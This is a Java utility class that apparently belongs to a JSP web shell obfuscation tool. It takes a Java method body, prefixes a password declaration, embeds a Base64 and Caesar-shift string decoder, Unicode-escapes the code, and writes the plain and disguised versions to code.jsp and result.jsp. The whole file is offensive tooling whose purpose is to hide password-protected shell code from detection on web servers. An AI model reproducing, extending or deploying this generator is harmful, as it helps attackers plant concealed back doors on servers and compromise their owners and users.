package org.sec.util;

import com.github.javaparser.ast.body.MethodDeclaration;

public class WriteUtil {
    private static final String decodeCode = "public static String dec(String str,int offset) {\n" +
            "        try {\n" +
            "            byte[] code = java.util.Base64.getDecoder().decode(str.getBytes(\"utf-8\"));\n" +
            "            str = new String(code);\n" +
            "            char c;\n" +
            "            StringBuilder str1 = new StringBuilder();\n" +
            "            for (int i = 0; i < str.length(); i++) {\n" +
            "                c = str.charAt(i);\n" +
            "                if (c >= 'a' && c <= 'z') {\n" +
            "                    c = (char) (((c - 'a') - offset + 26) % 26 + 'a');\n" +
            "                } else if (c >= 'A' && c <= 'Z') {\n" +
            "                    c = (char) (((c - 'A') - offset + 26) % 26 + 'A');\n" +
            "                } else if (c >= '0' && c <= '9') {\n" +
            "                    c = (char) (((c - '0') - offset + 10) % 10 + '0');\n" +
            "                } else {\n" +
            "                    str1 = new StringBuilder(str);\n" +
            "                    break;\n" +
            "                }\n" +
            "                str1.append(c);\n" +
            "            }\n" +
            "            return str1.toString();\n" +
            "        }catch (Exception ignored){\n" +
            "            return \"\";\n" +
            "        }\n" +
            "    }";

    public static void write(MethodDeclaration method, String password) {
        String passwordCode = "<%! String PASSWORD = \"" + password + "\"; %>";
        String code = method.getBody().isPresent() ? method.getBody().get().toString() : null;
        if (code != null) {
            String source = code.substring(1, code.length() - 2);
            String newCode = compactCode(source);
            newCode = UnicodeUtil.encodeString(newCode);
            String newDecodeCode = UnicodeUtil.encodeString(decodeCode);
            String output = passwordCode + "<%!" + newDecodeCode + "%><% " + newCode + " %>";
            source = passwordCode + "<%!" + decodeCode + "%><%" + source + " %>";
            try {
                FileUtil.writeFile("code.jsp", source);
                FileUtil.writeFile("result.jsp", output);
            } catch (Exception ignored) {
            }
        }
    }

    private static String compactCode(String input) {
        String[] codes = input.split(System.getProperty("line.separator"));
        StringBuilder codeBuilder = new StringBuilder();
        for (String c : codes) {
            codeBuilder.append(c.trim());
        }
        return codeBuilder.toString().trim();
    }
}
